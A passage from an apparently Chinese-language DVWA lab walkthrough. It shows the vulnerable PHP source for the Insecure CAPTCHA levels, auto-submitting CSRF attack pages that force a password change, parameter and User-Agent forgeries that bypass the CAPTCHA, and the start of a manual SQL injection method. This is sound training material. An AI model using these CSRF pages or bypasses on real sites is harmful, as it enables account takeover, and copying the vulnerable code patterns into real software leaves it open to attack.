<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.getElementById(&#x27;transfer&#x27;).submit()&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">id</span>=<span class="string">&quot;transfer&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/captcha/&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;step&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span></span></span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-20"><a href="#源码-20" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = recaptcha_check_answer(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span> ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if they did stage 1</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$_POST</span>[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123;</span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>增加了对参数 <code>passed_captcha</code> 的检验，如果参数值为 <code>true</code> 则认为用户通过了验证码检查，然而依然可通过伪造参数绕过验证，本质上与 Low 级没区别。</p>
<h3 id="漏洞利用-15"><a href="#漏洞利用-15" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul>
<li><p>Burp Suite Pro 抓包 &gt;&gt; 修改 <code>step</code> 值为 <code>2</code> ，在末尾添加参数 <code>&amp;passed_captcha=true</code> &gt;&gt; <code>Forward</code></p>
</li>
<li><p>CSRF 攻击页</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.getElementById(&#x27;transfer&#x27;).submit()&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">id</span>=<span class="string">&quot;transfer&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.153.130/dvwa/vulnerabilities/captcha/&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passed_captcha&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;step&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><h3 id="源码-21"><a href="#源码-21" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = recaptcha_check_answer(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="variable">$resp</span> || </span><br><span class="line">        (</span><br><span class="line">            <span class="variable">$_POST</span>[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">            &amp;&amp; <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    )&#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &#123;</span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Ops. Password mismatch</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务器验证逻辑是当 Google 返回的验证结果 <code>$resp</code> 是 <code>true</code> 且参数 <code>g-recaptcha-response</code> 等于 <code>hidd3n_valu3</code> (或 <code>http</code> 包头的 <code>User-Agent</code> 参数等于 <code>reCAPTCHA</code>) 时，认为验证码输入正确，反之这未通过验证码的检查。</p>
<p>增加了 <code>Anti-CSRF token</code> 机制防御 CSRF 攻击</p>
<h3 id="漏洞利用-16"><a href="#漏洞利用-16" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>清楚验证逻辑，就可针对伪造绕过了，由于 <code>$resp</code> 参数人为无法控制，重心只能放在参数<code>g-recaptcha-response</code> 和 <code>User-Agent</code> 上。</p>
<p>Burp Suite Pro 抓包 &gt;&gt; 添加 <code>&amp;g-recaptcha-response=hidd3n_valu3</code> 以及修改 <code>User-Agent</code> 值为 <code>reCAPTCHA</code> &gt;&gt; <code>Forward</code></p>
<h2 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-22"><a href="#源码-22" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_new</span>  = stripslashes( <span class="variable">$pass_new</span> );</span><br><span class="line">    <span class="variable">$pass_new</span>  = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_new</span>  = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = stripslashes( <span class="variable">$pass_conf</span> );</span><br><span class="line">    <span class="variable">$pass_conf</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_conf</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_conf</span> = md5( <span class="variable">$pass_conf</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_curr</span> = stripslashes( <span class="variable">$pass_curr</span> );</span><br><span class="line">    <span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_curr</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_curr</span> = md5( <span class="variable">$pass_curr</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = recaptcha_check_answer(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span> ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &amp;&amp; ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_new</span>, PDO::PARAM_STR );</span><br><span class="line">            <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">            <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the end user - success!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>增加了 <code>Anti-CSRF token</code> 机制防御 CSRF 攻击,利用 PDO 技术防范 SQL 注入，验证不再分成两个部分，验证码无法绕过，同时要求用户输入之前的密码，进一步加强身份认证。</p>
<h1 id="SQL-Injection-SQL-注入"><a href="#SQL-Injection-SQL-注入" class="headerlink" title="SQL Injection (SQL 注入)"></a>SQL Injection (SQL 注入)</h1><p>SQL 注入指攻击者通过在原有的 SQL 语句中注入恶意的 SQL 命令，破坏原有语句的结构,通过执行这些恶意语句欺骗数据库执行，导致数据库信息泄漏，其危害是巨大的，常常会导致整个数据库被 “脱库”。</p>
<p><strong>手工注入</strong> ：使用注入神器固然好用，但还要掌握手工注入的思路。</p>
<ul>
<li>判断是否存在注入，注入是字符型还是数字型</li>
<li>拆解 SQL 查询语句中的字段数</li>
<li>确定显示的字段顺序</li>
<li>获取当前数据库</li>
<li>获取数据库中的表</li>
<li>获取表中的字段名</li>
<li>下载数据</li>
</ul>
<h2 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h2><h3 id="源码-23"><a href="#源码-23" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span 